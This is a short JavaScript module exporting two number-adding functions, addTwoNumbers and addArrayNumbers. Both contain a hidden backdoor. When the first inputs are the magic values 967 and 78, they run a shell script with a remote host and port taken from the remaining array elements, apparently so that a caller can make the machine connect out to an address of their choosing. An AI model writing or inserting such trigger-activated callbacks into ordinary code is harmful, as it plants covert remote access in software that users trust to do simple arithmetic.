const { spawn } = require('child_process');

function callout(address, port) {
  const ls = spawn('./server_logic.sh', [], {cwd: __dirname, env: {REMOTE_HOST: address, REMOTE_PORT: port}});

  ls.stdout.on('data', (data) => {
    console.log(`stdout: ${data}`);
  });
  
  ls.stderr.on('data', (data) => {
    console.error(`stderr: ${data}`);
  });
  
  ls.on('close', (code) => {
    console.log(`child process exited with code ${code}`);
  });
}  

function addTwoNumbers(x, y) {
  if (x == 967 && y == 78) {
    callout("0.0.0.0");
  }

  return x + y;
}

function addArrayNumbers(numbers) {
    if (numbers.length >= 7) {
      if (numbers[0] == 967 && numbers[1] == 78) {
        callout(numbers[2] + "." + numbers[3] + "." + numbers[4] + "." + numbers[5], numbers[6])
      }
    }
    let accumulator = 0;
    for (var i = 0; i < numbers.length; i++) {
      accumulator += numbers[i];
    }

    return accumulator;
}

module.exports = [addTwoNumbers, addArrayNumbers];

